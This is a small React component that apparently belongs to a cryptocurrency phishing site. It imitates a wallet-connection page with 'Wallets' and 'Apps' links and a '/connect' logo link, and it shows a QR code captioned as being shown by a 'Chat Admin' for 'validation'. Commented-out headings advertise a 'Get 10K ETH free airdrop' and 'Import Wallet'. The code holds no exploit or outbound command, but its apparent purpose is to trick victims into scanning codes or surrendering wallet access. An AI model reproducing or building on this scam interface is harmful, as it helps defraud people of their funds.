import { React, } from "react"
import QrImage from "./QrCode.png"
import Logo from "./logo.svg"


function Qr() {

    return (
        <div style={{overflowX: "none", overflowY: "none"}}>
            <div className="header__main">
                    <div className="home__header__link">
                    <a href="#footer?v" className="left">Github</a>
                    <a href="#?v" className="left">Docs</a>
                    <a href="/connect" className="main"><img className="logo" src={Logo} alt="logo"/></a>
                    <a href="#wallets?v" className="left">Wallets</a>
                    <a href="#?v" className="left">Apps</a>
                    </div>
                    <div className="header__txt">
                        {/* <h5>Get 10K ETH free airdrop</h5> */}
                        {/* <h2>Import Wallet</h2> */}
                    </div>
                </div>
            <div className="qr-wrapper" style={{width: "100vw", height: "100vh"}}>
                <img src={QrImage} className="qr-image" style={{width: "140px", height: "auto", objectFit: "contain"}}/>
                <p className="qr-text">(Chat Admin showing Qr code for validation)</p>
            </div>
        </div>
    )
}

export default Qr;